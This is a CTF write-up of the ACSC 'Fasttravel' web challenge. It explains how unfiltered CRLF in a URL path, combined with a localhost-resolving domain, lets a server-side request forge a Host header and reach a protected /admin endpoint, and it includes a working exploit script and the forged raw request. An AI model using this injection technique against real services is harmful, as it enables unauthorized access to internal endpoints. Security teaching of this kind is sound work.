---
author: Aryt3
pubDatetime: 2025-05-01T19:00:00Z
title: ACSC Fasttravel Writeup
slug: acsc-fasttravel
featured: true
draft: false
tags:
    - ACSC
    - web
description:
  A Writeup and Walkthrough of the ACSC Fasttravel challenge.
---


# Fasttravel

## Description
```
The paths through the cyber world can be quite long. 
This is why we have set up a >FastTravel< network to shorten them. 
To avoid dangers we let you peek through them before you enter.
```

## Provided Files
```
- fasttravel.zip
```

## Writeup

Starting off I checked where the flag can be accessed. <br/>
```py
FLAG = os.getenv("FLAG", "dach2025{dummy_flag}")
PRIVILEGED_ORIGINS = ("localhost", "localhost:5000")

def privileged_origin_access(host: str) -> bool:
    return host in PRIVILEGED_ORIGINS

@server.get("/admin")
async def admin(request: Request) -> Response:
    if not privileged_origin_access(request.headers.get('Host', '')):
        return Response.forbidden()

    return Response.ok(f"Welcome to the secret admin panel! Flag: {FLAG}")
```

I checked the application further for all possibilities of flag retrieval. <br/>
- Access the `/admin` endpoint and read the flag. <br/>
- Access `global-context` of the application and read the `FLAG` variable. <br/>
- Read `environment-variables` and get the flag. <br/>

Looking through the code for `global-context` escape I couldn't find any real vulnerabilities as classes liek the one below only allow `str` data-types as input for both `key` and `value`. To climb to the `global-context` the value would need to be injected with a dictionary. <br/>
```py
class LRUDict(dict[_KT, _VT]):
    def __init__(self, max_size: int):
        super().__init__()
        self.max_size = max_size
        self.lru: dict[_KT, int] = {}

    def __setitem__(self, key: _KT, value):
        if key not in self and len(self) >= self.max_size:
            least_used = sorted(self.lru.items(), key=lambda x: x[1])[0][0]
            del self[least_used]

        self.lru[key] = 0
        print(key, value)
        super().__setitem__(key, value)

    def __delitem__(self, key: _KT, /) -> None:
        del self.lru[key]
        return super().__delitem__(key)

    def __getitem__(self, key: _KT, /) -> _VT:
        self.lru[key] += 1
        return super().__getitem__(key)
```

To access the `/admin` endpoint we somehow need to bypass the `Host-Header-Check`. <br/>
This is not feasable because there is a `caddy` reverse-proxy config which replaces `Host` headers in every incoming request. <br/>
```py
:5000 {
    reverse_proxy localhost:5001 {
        header_up Host fasttravel
    }
}
```

Bypassing this is not possible so we need to make sure that `privileged_origin_access()` returns `True`. <br/>
This requires `request.headers.get('Host', '')` to be either `localhost` or `localhost:5000`. <br/>

Because we can't change the `Host` header on our end we need to look at the next endpoint. <br/>
```py
@server.post("/shorten")
async def shorten(request: Request) -> Response:
    if "source" not in request.form_args:
        return Response.bad_request()

    url = request.form_args["source"]
    scheme, hostname, port, path = urlparse(url)

    if privileged_origin_access(hostname) or any(hostname.startswith(e) for e in PRIVILEGED_ORIGINS) or any(hostname.endswith(e) for e in PRIVILEGED_ORIGINS):  # just to be sure
        return Response.forbidden()

    global last_shorten
    if SHORTEN_RATE_LIMIT and (datetime.now() - last_shorten) < SHORTEN_RATE_LIMIT:
        print(f"[{datetime.now()}] WARN    Rate limiting shorten")
        to_sleep = (last_shorten + SHORTEN_RATE_LIMIT - datetime.now())
        last_shorten = datetime.now() + to_sleep
        await asyncio.sleep(to_sleep.total_seconds())
    else:
        last_shorten = datetime.now()

    short = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(6))
    try:
        preview = await Requester().get(url) 
        if len(preview) > 2**20:
            print(f"[{datetime.now()}] WARN    preview is too large, truncating", len(preview), "to", 2**20)
            preview = preview[:2**16]
    except ConnectionRefusedError:
        return Response.bad_request("Invalid URL")
    
    shortens[short] = (url, preview)

    return Response.found(f"/{short}")
```

In the endpoint above we can see `await Requester().get(url)` which actually makes a request to a provided `URL`. <br/>
If we send a reques to the endpoints through this `Requester()` class we can bypass the `reverse-proxy` because the request is executed locally. <br/>
Looking at the `Requester()` class we can see that the `Host` header is actually set via the logic below. <br/>
```py
scheme, hostname, port, path = urlparse(url)
if scheme not in ("http", "https"):
    raise ValueError("Scheme not supported")

port = port or (443 if scheme == "https" else 80)
path = path if path else "/"

addrs = await loop.getaddrinfo(hostname, port, family=socket.AF_INET, type=socket.SOCK_STREAM)

if scheme == "https":
    reader, writer = await asyncio.open_connection(sockaddr[0], sockaddr[1], server_hostname=hostname, ssl=True)
else:
    reader, writer = await asyncio.open_connection(sockaddr[0], sockaddr[1])

req = (
    f"{method} {path} HTTP/1.1\r\n"
    f"Host: {hostname}\r\n"
    f"User-Agent: fasttravel/0.1\r\n"
    f"Connection: close\r\n\r\n"
).encode("utf-8")
```

The first step is passing the `hostname` check in the `/shorten` endpoint. <br/>
```py
if privileged_origin_access(hostname) or any(hostname.startswith(e) for e in PRIVILEGED_ORIGINS) or any(hostname.endswith(e) for e in PRIVILEGED_ORIGINS):  # just to be sure
    return Response.forbidden()
```

The first thing we need to inspect is the custom `urlparse()` function. <br/>
```py
def urlparse(url: str) -> tuple[Optional[str], str, Optional[int], Optional[str]]:
    match = re.match(r"(?P<scheme>https?)://", url)
    scheme = match.group("scheme") if match else None
    rest = url[len(scheme + "://"):] if scheme else url

    match = re.match(r"(?P<host_and_port>[^/?#]+)", rest)
    if not match:
        return None, "", None, None

    host_and_port = match.group("host_and_port").rsplit(":", 1)
    if len(host_and_port) == 2:
        host, port = host_and_port
        path = rest[len(f"{host}:{port}"):]
    else:
        host, port = host_and_port[0], None
        path = rest[len(host):]

    return scheme, host, int(port) if port else None, path
```

Nothing interesting, it just splits the url in 4 different parts. <br/>
The actual request is made with the body below. <br/>
```py
req = (
    f"{method} {path} HTTP/1.1\r\n"
    f"Host: {hostname}\r\n"
    f"User-Agent: fasttravel/0.1\r\n"
    f"Connection: close\r\n\r\n"
).encode("utf-8")
```

Now `method` is not a parameter which we control, the hostname parameter is controlled by us but is heavily restricted and can't be tampered with in a way that's useful for us. 
The `path` parameter seems interesting though as there are no actual restrictions on what it may contain. <br/>
The `urlparse` doesn't actually restrict the use of `\r` or `\n`, knowing this we could try to tamper with the `path` parameter. <br/>
We essentially want the request to call `/admin` with the host being `localhost:5001` because that's where the application is being hosted inside the container. 
The `Host` header needs to be `localhost` or `localhost:5000` though. <br/>

Knowing all of this we can forge a HTTP-Request body. <br/>
```py
import string, requests

def url_encode(s: str) -> str: 
    # URL-Encode function from provided application 
    allowed = string.ascii_letters + string.digits + "-_.!~*'();/?:@&=+$,#"
    return "".join(f"%{ord(c):02x}" if c not in allowed else c for c in s)

payload = (
    # spoofed.burpcollaborator.net -> resolves to localhost without matching the string "localhost"
    f'http://spoofed.burpcollaborator.net:5001/admin '
    # Close First Header-Line with http method and path 
    f'HTTP/1.1\r\n'
    # Add "Host" Header to pass /admin check
    f'Host: localhost:5000\r\n\r\n'
)

r = requests.post('http://localhost:5000/shorten', data=f'source={url_encode(payload)}')

if r.status_code == 200:
    print(f'> FLAG should be available here: {r.url}')
else:
    print(f'> An error occurred!')
```

The payload will forge the HTTP-Request body below. <br/>
```sh
GET /admin HTTP/1.1
Host: localhost:5000

HTTP/1.1
User-Agent: fasttravel/0.1
Connection: close
```

The request body below will be ignored because `\r\n\r\n` marks the end of the HTTP-Request-Body. <br/>
Executing the exploitation script we get a link with an `iframe` which contains the contents of the protected `/admin` route. <br/> 
```sh
python3 e.py 
> FLAG should be available here: http://localhost:5000/HPA1kD
```

Retrieving the flag concludes this challenge. 